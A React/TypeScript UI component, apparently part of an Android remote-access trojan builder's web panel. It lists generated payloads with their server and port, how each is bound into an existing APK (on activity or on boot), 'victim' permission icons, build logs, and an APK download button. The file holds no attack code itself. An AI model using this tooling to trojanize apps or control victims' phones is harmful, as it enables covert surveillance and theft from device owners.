import './styles.scss';

import { Button, ToggleButton } from '@fluentui/react-components';
import {
    faCalendar,
    faClock,
    faDownload,
    faHammer,
    faLink,
    faServer,
    faTerminal,
    faTrash,
    faUnlockKeyhole,
} from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dayjs from 'dayjs';
import humanizeDuration from 'humanize-duration';
import { observer } from 'mobx-react-lite';
import React, {
    useCallback,
    useEffect,
    useLayoutEffect,
    useState,
} from 'react';

import {
    BindingMethod,
    PackagingMode,
    PayloadStatus,
    VictimOrder,
} from '../../../common/enums';
import { type PayloadItem } from '../../store';
import { useIsMobile } from '../../utils/CustomHooks';
import {
    LogStatusIconMap,
    PayloadStatusIconMap,
    VictimOrderPermissionIconMap,
    VictimOrderPermissionTextMap,
} from '../../utils/Mappings';
import { LoadingOverlay } from '../LoadingOverlay';

interface IProps {
    payload: PayloadItem;
}

export const PayloadCard: React.FC<IProps> = observer(({ payload }) => {
    const isMobile = useIsMobile();

    const [expanded, setExpanded] = useState(false);
    const [deleting, setDeleting] = useState(false);

    const logsContainerRef = React.useRef<HTMLDivElement>(null);

    const onDelete = useCallback(() => {
        const id = payload.id;

        setDeleting(true);

        axios
            .delete(`/api/payload/${id}`)
            .then(() => {
                // TODO: Show toast
            })
            .catch((error) => {
                console.error('Failed to delete payload', error);
                setDeleting(false);
            });
    }, [payload.id]);

    useEffect(() => {
        if (payload.status === PayloadStatus.INPROGRESS) {
            setExpanded(true);
        }
    }, [payload.status]);

    useLayoutEffect(() => {
        if (expanded && logsContainerRef.current) {
            const handle = requestAnimationFrame(() => {
                if (logsContainerRef.current)
                    logsContainerRef.current.scrollTop =
                        logsContainerRef.current.scrollHeight;
            });

            return () => {
                cancelAnimationFrame(handle);
            };
        }
    }, [expanded, payload.logs]);

    return (
        <div className={`payload-card ${expanded ? 'expanded' : ''}`}>
            <div className='info-container'>
                <div className='info'>
                    <FontAwesomeIcon icon={faCalendar} />
                    <div className='value date'>
                        <div className='label'>Date</div>
                        <div className='text'>
                            {dayjs(payload.createdAt).format(
                                'DD MMMM YYYY hh:mm A',
                            )}
                        </div>
                    </div>

                    <FontAwesomeIcon icon={faServer} />
                    <div className='value server'>
                        <div className='label'>Server</div>
                        <div className='text'>
                            {payload.server}:{payload.port}
                        </div>
                    </div>

                    <FontAwesomeIcon icon={faHammer} />
                    <div className='value '>
                        <div className='label'>Packaging Mode</div>
                        <div className='text'>
                            {payload.packagingMode === PackagingMode.STANDALONE
                                ? 'Standalone'
                                : `Bind to ${payload.existingAPKName}`}
                        </div>
                    </div>

                    {payload.packagingMode ===
                        PackagingMode.BIND_TO_EXISTING_APK && (
                        <>
                            <FontAwesomeIcon icon={faLink} />
                            <div className='value '>
                                <div className='label'>Binding Method</div>
                                <div className='text'>
                                    {payload.bindingMethod ===
                                    BindingMethod.ACTIVITY
                                        ? 'On Activity'
                                        : 'On Boot'}
                                </div>
                            </div>
                        </>
                    )}

                    <FontAwesomeIcon icon={faUnlockKeyhole} />
                    <div className='value permissions'>
                        <div className='label'>Permissions</div>
                        <div className='text'>
                            {(payload.permissions.length
                                ? payload.permissions
                                : Object.values(VictimOrder)
                            ).map((permission, index) => (
                                <FontAwesomeIcon
                                    icon={
                                        VictimOrderPermissionIconMap[permission]
                                    }
                                    key={index}
                                    title={
                                        VictimOrderPermissionTextMap[permission]
                                    }
                                />
                            ))}
                        </div>
                    </div>

                    <FontAwesomeIcon
                        className={`status ${payload.status}`}
                        icon={PayloadStatusIconMap[payload.status]}
                    />
                    <div className={`value status ${payload.status}`}>
                        <div className='label'>Status</div>
                        <div className='text'>{payload.status}</div>
                    </div>

                    {payload.packagingMode === PackagingMode.STANDALONE &&
                        !expanded && (
                            <>
                                <FontAwesomeIcon
                                    icon={faLink}
                                    style={{ visibility: 'hidden' }}
                                />
                                <div
                                    className='value '
                                    style={{ visibility: 'hidden' }}
                                >
                                    <div className='label'></div>
                                    <div className='text'></div>
                                </div>
                            </>
                        )}

                    <div className='actions'>
                        {payload.status !== PayloadStatus.INPROGRESS && (
                            <Button
                                className='delete'
                                appearance='subtle'
                                icon={<FontAwesomeIcon icon={faTrash} />}
                                title='Delete'
                                onClick={onDelete}
                            />
                        )}
                        <div className='fill'></div>
                        <ToggleButton
                            appearance='subtle'
                            icon={<FontAwesomeIcon icon={faTerminal} />}
                            title='Show Logs'
                            checked={expanded}
                            onClick={() => {
                                setExpanded(!expanded);
                            }}
                        />
                        <Button
                            appearance='subtle'
                            icon={<FontAwesomeIcon icon={faDownload} />}
                            title='Download APK'
                            onClick={() => {
                                window.open(
                                    `/download/${payload.id}`,
                                    '_blank',
                                );
                            }}
                        />
                    </div>
                </div>
            </div>
            {expanded && (
                <div className='logs-container' ref={logsContainerRef}>
                    <div className='logs-list'>
                        {payload.logs.map((log, index) => (
                            <div
                                key={log.id}
                                className={`log-row ${log.status}`}
                            >
                                <div>
                                    <div className='with-icon'>
                                        <FontAwesomeIcon icon={faClock} />
                                        <span>
                                            {dayjs(log.createdAt).format(
                                                isMobile
                                                    ? 'HH:mm:ss'
                                                    : 'DD-MM-YYYY HH:mm:ss',
                                            )}
                                        </span>
                                    </div>
                                </div>
                                <div>
                                    <div>{log.message}</div>
                                    {log.error && <div>{log.error}</div>}
                                </div>
                                <div>
                                    {humanizeDuration(
                                        log.updatedAt - log.createdAt,
                                        { units: ['h', 'm', 's', 'ms'] },
                                    ).replace(
                                        /(hours?|minutes?|seconds?|milliseconds?)/g,
                                        (match) => {
                                            return match === 'millisecond' ||
                                                match === 'milliseconds'
                                                ? 'ms'
                                                : match[0].slice(0, 1);
                                        },
                                    )}
                                </div>
                                <div>
                                    <div className='with-icon status'>
                                        <FontAwesomeIcon
                                            icon={LogStatusIconMap[log.status]}
                                        />
                                        <span>{log.status}</span>
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}
            <LoadingOverlay loading={deleting} type='semi-transparent' />
        </div>
    );
});
